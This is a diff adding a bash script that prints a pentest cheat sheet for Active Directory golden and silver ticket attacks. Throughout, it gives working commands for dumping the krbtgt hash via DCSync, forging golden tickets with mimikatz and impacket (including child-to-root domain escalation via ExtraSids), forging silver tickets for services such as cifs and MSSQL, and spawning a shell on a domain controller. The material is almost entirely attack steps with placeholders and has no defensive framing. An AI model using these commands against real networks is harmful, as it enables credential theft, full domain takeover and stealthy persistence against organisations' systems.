@@ -1,0 +1,61 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── GOLDEN & SILVER TICKET ───────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Step 1 — Get krbtgt hash (DCSync) ───────────────${NC}"
+echo -e "  ${GREEN}nxc smb <DC_IP> -u <USER> -p <PASS> --ntds${NC}                  # nxc"
+echo -e "  ${GREEN}impacket-secretsdump DOMAIN/user:pass@<DC_IP>${NC}               # secretsdump"
+echo -e "  ${GREEN}mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt${NC}    # mimikatz"
+printf "\n"
+echo -e "  Note: Need also Domain SID"
+echo -e "  ${GREEN}Get-DomainSID${NC}                            # PowerView"
+echo -e "  ${GREEN}lookupsid.py DOMAIN/user:pass@<DC_IP> 0${NC}  # impacket"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Golden Ticket ────────────────────────────────────${NC}"
+echo -e "  Note: krbtgt hash -> any user, any service"
+printf "\n"
+echo -e "  Note: Mimikatz:"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt${NC}"
+printf "\n"
+echo -e "  Note: impacket ticketer:"
+echo -e "  ${GREEN}ticketer.py -nthash '<KRBTGT_HASH>' -domain-sid '<DOMAIN_SID>' -domain 'DOMAIN.LOCAL' administrator${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+echo -e "  ${GREEN}impacket-psexec administrator@<DC_FQDN> -k -no-pass${NC}"
+printf "\n"
+echo -e "  Note: Cross-domain - child -> root (ExtraSids):"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:child.corp.com /sid:<CHILD_SID> /krbtgt:<CHILD_KRBTGT> /sids:<ROOT_SID>-519 /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Silver Ticket ────────────────────────────────────${NC}"
+echo -e "  Note: service account NTLM hash + SPN + domain SID"
+echo -e "  Note: More stealthy than golden — no DC contact needed to use"
+printf "\n"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:corp.com /sid:<DOMAIN_SID> /rc4:<SVC_HASH> /target:srv01.corp.com /service:cifs /ptt${NC}"
+echo -e "  ${GREEN}kerberos::golden /user:h4x /domain:corp.com /sid:<DOMAIN_SID> /rc4:<SVC_HASH> /target:mssql01 /service:MSSQLSvc /ptt${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Common Services for Silver Ticket ────────────────${NC}"
+echo -e "  ${GREEN}cifs${NC}          # SMB file access (C\$, ADMIN\$)"
+echo -e "  ${GREEN}host${NC}          # Task scheduler, WMI, remote PS"
+echo -e "  ${GREEN}MSSQLSvc${NC}      # MSSQL access"
+echo -e "  ${GREEN}HTTP/WSMAN${NC}    # WinRM / PowerShell remoting"
+echo -e "  ${GREEN}LDAP${NC}          # DCSync operations"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Use the Ticket ───────────────────────────────────${NC}"
+echo -e "  ${GREEN}klist${NC}                            # verify injected"
+echo -e "  ${GREEN}dir \\\\dc01\\c\$${NC}                    # test access"
+echo -e "  ${GREEN}psexec \\\\dc01 cmd.exe${NC}            # spawn shell"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
